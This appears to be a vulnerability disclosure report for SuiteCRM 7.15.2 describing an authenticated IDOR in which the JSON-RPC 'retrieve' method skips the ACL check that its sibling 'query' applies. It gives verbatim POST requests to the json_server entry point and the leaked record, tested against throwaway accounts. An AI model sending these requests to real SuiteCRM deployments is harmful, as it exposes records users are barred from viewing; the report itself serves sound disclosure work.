# VULN-001 — JSON-RPC `retrieve`: authenticated IDOR, read any record of any module

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: High (CVSS 3.1 6.5 — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: 2026-09-28T20:1x (see run.log)

## Preconditions
- Fresh low-priv user `mod_5c265405` (id `d55ed419-15e2-4e6d-9660-ecf7efa5668d`) via `_common.create_user`.
- A throwaway ACL Role (`961ddd3e-1664-4806-b455-ed6cfea3a183`) inserted directly into
  `acl_roles`/`acl_roles_actions`/`acl_roles_users` via `_c1_common.restrict_role`, setting
  `Opportunities` `view`=`list`=`ACL_ALLOW_NONE(-99)`, assigned **only** to this one test user.
  This models a real restrictive Role/Security-Group configuration — verified empirically that a
  stock install has `acl_actions.aclaccess=90 (ALL)` for every Opportunities action with zero
  roles configured (`SELECT * FROM acl_actions WHERE category='Opportunities'`), so the bypass is
  only observable once an org actually restricts something, exactly as the static finding frames it
  ("defeats Security-Groups multi-team isolation").
- Victim Opportunity `50a8963f-0cbd-44ce-aabf-aab3456562ff` created by **admin** via legacy REST
  `set_entry`, `description` = random secret marker `CVEHUNTER-SECRET-opp_eeb3c181`, confirmed
  written into the `opportunities` DB row directly (not just trusting the API's own echo).

## Request
Both calls use the SAME low-priv authenticated web session (`PHPSESSID` cookie from `web_login`):
```
POST /index.php?entryPoint=json_server HTTP/1.1
Content-Type: application/json

{"method":"query","id":"1","params":[{"module":"Opportunities","conditions":[{"name":"id","op":"contains","value":"50a8963f-0cbd-44ce-aabf-aab3456562ff"}],"field_list":["id","name","description"]}]}
```
then the decisive request (saved verbatim in `request.http`):
```
POST /index.php?entryPoint=json_server HTTP/1.1
Content-Type: application/json

{"method":"retrieve","id":"2","params":[{"module":"Opportunities","record":"50a8963f-0cbd-44ce-aabf-aab3456562ff"}]}
```

## Response
`query()` (ACL'd sibling, control): `{"id":"1","result":{"list":[]}}` — **zero rows**, confirming
the Role restriction is live and enforced by the method that does check ACL.

`retrieve()` (the vulnerable sink, saved in `response.txt`):
```json
{"id":"2","result":{"status":"success","record":{"module":"Opportunity","fields":{
  "id":"50a8963f-0cbd-44ce-aabf-aab3456562ff",
  "name":"Stage10 VULN-001 target n_c1fd284e",
  "description":"CVEHUNTER-SECRET-opp_eeb3c181",
  ... }}}}
```
— the **full record**, including the admin-only secret, to the same view=list=NONE user.

## Observation
Exactly matches the static finding: `retrieve()` (`JsonRPCServerCalls.php:69-70`) has no
`ACLAccess()`/Security-Group check, while its sibling `query()` (`:148`) correctly gates with
`$focus->ACLAccess('ListView', true)`. Live evidence isolates precisely this one missing check:
same session, same record, same endpoint family — `query` blocked, `retrieve` leaked everything.
The leaked `description` field is a byte-for-byte match for the value independently verified in
the `opportunities` table (`SELECT description FROM opportunities WHERE id=...`), so this is a
real cross-ACL data read, not a coincidence or a stale cache artifact.

## Side effects
- Created 1 throwaway user, 1 throwaway Role (+ 2 `acl_roles_actions` rows + 1 `acl_roles_users`
  row), 1 Opportunity — all random-suffixed, all attributable to this run, none touching any other
  account.
- No destructive changes. Nothing deleted.

## Research & references
CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-284 (Improper Access Control).
OWASP WSTG-ATHZ-04 (Testing for Insecure Direct Object References): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
